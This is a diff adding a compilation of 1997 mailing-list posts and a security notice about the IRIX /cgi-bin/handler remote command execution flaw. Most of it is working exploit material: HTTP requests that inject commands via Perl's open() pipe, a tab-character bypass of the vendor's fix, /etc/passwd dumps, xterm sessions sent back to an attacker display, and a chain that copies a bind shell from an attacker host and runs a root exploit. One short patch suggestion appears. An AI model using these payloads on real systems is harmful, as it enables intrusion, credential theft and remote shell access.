@@ -1,0 +1,297 @@
+/cgi-bin/handler is a small perl program that allows (in theory) 
+to read and download files under the system's root directory.
+In fact it allows you to execute any command remotely
+on the target machine.
+
+Here's how it works:
+"handler" reads PATH_INFO from the environment and then concatenates it
+with a default "root directory" (let's say /var/www/htdocs). It then runs
+a "validity check" on the result. But it only checks for ".." not for
+other potential offensive special chars.
+It then uses "open (INPUT, $doc)" where $doc is the result of the
+concatenation.
+If you're familiar with PERL you know that if a '|' character follows the
+filename, perl will treat that filename as a command. It runs it and gives
+you STDOUT.
+The way to exploit this "feature" for cgi-bin/handler is:
+
+telnet target.machine.com 80
+GET /cgi-bin/handler/useless_shit;cat   /etc/passwd|?data=Download
+HTTP/1.0
+
+Note that you have to use a TAB character after cat, not a space because
+the shell will accept it as a separator and it won't confuse the HTTP
+server. You can't use the %xx format (%20) because the script doesn't do
+any parsing (So you will not be able to give command that contain spaces).
+
+Of course, you can use any other command instead of "cat" but remember NOT
+to use spaces, just tabs.
+
+The server will display an error saying that it couldn't open
+"useless_shit" but it will continue anyway and execute your command.
+
+I tested it on two Indy machines with IRIX 6.2.
+
+And also, I think this kind of approach makes cgi-bin's written in perl
+more vulnerable. That is any script that does not strip special
+characters (not only dots, but also | and ; ) and uses "open" commands on
+files read from user input can be attacked. Most of the cgi-bin's I've
+seen do only a rudimentary check for "double-dots" and then declare the
+URL "sane".
+
+
+==========================================================================
+
+
+I have had reports that my exploit for SGI's /cgi-bin/handler does not
+work on IRIX 6.3 (on O2).  I analyzed the code provided with IRIX
+6.3 and they tried to fix it, but they actually DID NOT.
+
+They added a new line to the script:
+
+$doc=~s/\|*$// (in plain English, this means "remove any number of '|'s at
+end-of-string"). But guess what. It works just as fine if you put another
+TAB character after the "pipe" (so that the "pipe" is not at
+end-of-string, the TAB is).
+
+The exploit should read
+
+telnet target.machine.com 80
+GET /cgi-bin/handler/whatever;cat       /etc/passwd|    ?data=Download
+HTTP/1.0
+
+It tricks the script into executing the command anyway.
+Now, for those of you who want to patch it somehow, here's the best
+solution that has been posted to me (all credits for it go to Wolfram
+Schneider <wosch@apfel.de>)
+
+All "open" commands should check if the their argument is really a
+filename. You could use:
+
+-f $doc && open (INPUT, $doc)
+
+(Same thing as: if (-f $doc) {open (INPUT, $doc) } , the one written
+above is more PERL style)
+
+So far, IRIX versions 5.3, 6.2, and now 6.3 are vulnerable.
+
+
+===========================================================================
+
+
+If you have untrusted local users who can install their own cgi-bin
+stuff (I know of at least one large site that is in this situation),
+this isn't enough.  /cgi-bin/handler/whatever;cat\t/etc/passwd\|\t may
+well exist, and open() will _still_ take it as a pipe.
+
+
+===========================================================================
+
+
+IRIX 6.4 is also vulnerable to this exploit.
+
+
+===========================================================================
+
+
+Systems Affected:
+ALL IRIX systems (Including 6.4) with the default web server installed,
+any web server with the "cgi-handler" script installed.
+
+Quite a while ago, Razvan Dragomirescu (drazvan@kappa.ro) released a
+report on the default cgi-handler scripts that ship with IRIX systems
+with web servers, and some other web server programs. Just like with
+the phf bug, with the cgi-handler bug a malicious user could start
+an xterm from the server machine on their own system.
+
+Example:
+
+telnet www.highly.respectable.bank.com 80
+Trying 300.300.300.1...
+Connected to www.highly.respectable.bank.com
+Escape character is '^]'.
+GET /cgi-bin/handler/blah;xwsh  -display        yourhost.com|?data=Download
+
+Please note the format of the "GET" querey. The above assumes xwsh is in the
+PATH somewhere, and the "space" between "xwsh" and "-display" should be a TAB.
+
+In addition, please note that in theory this should also work for
+/cgi-bin/wrap CGI script.
+
+===========================================================================
+
+>
+> telnet www.highly.respectable.bank.com 80
+> Trying 300.300.300.1...
+> Connected to www.highly.respectable.bank.com
+> Escape character is '^]'.
+> GET /cgi-bin/handler/blah;xwsh  -display   yourhost.com|?data=Download
+>
+> Please note the format of the "GET" query. The above assumes xwsh is in the
+> PATH somewhere, and the "space" between "xwsh" and "-display" should be a TAB.
+
+I've got some problems while trying that...
+First it seems, that the xwsh was not in the path so I tried to call
+xwsh with a given path (note that all whitespaces after GET
+/cgi-bin/handler/ must be Tabs...):
+
+enemy% telnet victim 80
+Trying 1.2.3.4...
+Connected to victim.
+Escape character is '^]'.
+GET /cgi-bin/handler/ ;/usr/sbin/xwsh  -display  enemy:0|?data=Download
+UX:sh (sh): ERROR: Connection closed by foreign host.
+enemy%
+
+That opened the xwsh window... But there was only one error-message in
+the first line:
+
+/usr/sbin/xwsh: Permission denied: can't start command
+
+Hm - What could that be? Doesn't matter - Lets see what I can do with
+other commands... (Remember the tabs...)
+
+enemy% telnet victim 80
+Trying 1.2.3.4...
+Connected to victim.
+Escape character is '^]'.
+GET /cgi-bin/handler/   ;cat    /etc/passwd|?data=Download
+UX:sh (sh): ERROR: root:x:0:0:Super-User:/:/bin/csh
+sysadm:x:0:0:System V Administration:/usr/admin:/bin/sh
+[... I wont give you that ;) ...]
+nobody:x:60001:60001:SVR4 nobody uid:/dev/null:/dev/null
+[... and again some more ...]
+Connection closed by foreign host.
+
+Hm - a shadowed passwd... was my first thought... Lets see If I can get
+the shadow... [As above] - Didnt work. So It seems that the WWWserver
+was not running as root (what a pity ;). If it does not run as root - it
+usually runs as nobody. And what can we see above? Nobody got the shell
+/dev/null - thats why my xwsh was not able to start a command. Next Try
+was to give xwsh the command that it should start... (And again: Tabs! -
+and of course everything in one line...)
+
+enemy% telnet victim 80
+Trying 1.2.3.4...
+Connected to victim.
+Escape character is '^]'.
+GET /cgi-bin/handler/;/usr/sbin/xwsh  -display  enemy:0  -e
+/bin/csh|?data=Download
+UX:sh (sh): ERROR: Connection closed by foreign host.
+enemy%
+
+And voila! - What else do you want? Any other programs to start? Just
+try...
+
+======================================================================
+
+> Trying 1.2.3.4...
+> Connected to victim.
+> Escape character is '^]'.
+> GET /cgi-bin/handler/;/usr/sbin/xwsh  -display  enemy:0  -e
+> /bin/csh|?data=Download
+> UX:sh (sh): ERROR: Connection closed by foreign host.
+> enemy%
+
+s/xwsh/xterm/ and this works the same.
+
+to reiterate Razvan's follow-up to the original posting on the
+cgi-bin/handler issue, in Irix 6.3 (O2s) they attempted to fix this with
+the line:
+
+    # trim off trailing pipes
+    $doc =~ s/\|*$// ;
+
+which can be fooled by appending a <tab> char after the pipe, thus:
+
+GET /cgi-bin/handler/<tab>;xterm<tab>-display<tab>danish:0<tab>-e<tab>
+/bin/sh|<tab>?data=Download
+       ^^^^^^
+(one line, emphasis under the necessary change)
+
+which can be applied to the xwsh, or cat /etc/passwd attacks or whatever.
+
+this is not matched by the pattern s/\|*$//, but the appended tab does
+not change the behavior of perl's open(yadda, "yadda|") statement since
+whitespace following the '|' is ignored.
+
+Yuri's post to Bugtraq of Fri, 16 May 1997 #2551 at
+http://www.netspace.org/lsv-archive/bugtraq.html is a good read for more
+info on why SGIs /var/www/cgi-bin directory should be nuked with extreme
+prejudice...
+
+========================================================================
+
+> enemy% telnet victim 80
+> Trying 1.2.3.4...
+> Connected to victim.
+> Escape character is '^]'.
+> GET /cgi-bin/handler/;/usr/sbin/xwsh  -display  enemy:0  -e
+> /bin/csh|?data=Download
+> UX:sh (sh): ERROR: Connection closed by foreign host.
+> enemy%
+>
+> And voila! - What else do you want? Any other programs to start? Just
+> try...
+>
+
+        Keep in mind that it isn't necessary to get everything done in one
+command.  A string of two or three commands might sometimes be necessary
+to get things moving.  For example:
+enemy% whoami
+evil_cracker
+enemy% echo + + > .rhosts
+enemy% nc victim.com 80
+GET /cgi-bin/handler/;/usr/bsd/rcp      evil_cracker@enemy.com:portshell        /tmp|?data=Download
+enemy% nc victim.com 80
+GET /cgi-bin/handler/;/tmp/portshell    31337|?data=Download
+enemy% nc victim.com 31337
+% whoami
+nobody
+% rcp evil_cracker@enemy.com:irix_root_bug_of_the_week.sh \
+./irbotw.sh ; ./irbotw.sh
+#
+[... or whatever ...]
+
+"portshell" being a program that bound itself to a TCP port and executed a
+shell upon receiving a connection.  Boom, shell access obtained under
+whatever uid httpd is running as.  Or, one could even create a dummy
+inetd.conf and run their own copy of inetd.  The possiblities are
+virtually limitless.
+
+
+======================================================================
+
+
+ ************** Corinne Posse Security Notice  **************
+Issue Number 7: 970723
+ *****************  http://posse.cpio.org  ******************
+
+** (Please note our new address at cpio.org !!!) **
+
+**** Systems Security and Safety-- known breech ****
+
+Systems Affected:
+ALL IRIX systems (Including 6.4) with the default web server installed,
+any web server with the "cgi-handler" script installed.
+
+Quite a while ago, Razvan Dragomirescu (drazvan@kappa.ro) released a
+report on the default cgi-handler scripts that ship with IRIX systems
+with web servers, and some other web server programs. Just like with
+the phf bug, with the cgi-handler bug a malicious user could start
+an xterm from the server machine on their own system.
+
+Example:
+
+telnet www.highly.respectable.bank.com 80
+Trying 300.300.300.1...
+Connected to www.highly.respectable.bank.com
+Escape character is '^]'.
+GET /cgi-bin/handler/blah;xwsh  -display        yourhost.com|?data=Download
+
+Please note the format of the "GET" querey. The above assumes xwsh is in the
+PATH somewhere, and the "space" between "xwsh" and "-display" sould be a TAB.
+
+In addition, please note that in theory this should also work for
+/cgi-bin/wrap CGI script.
+
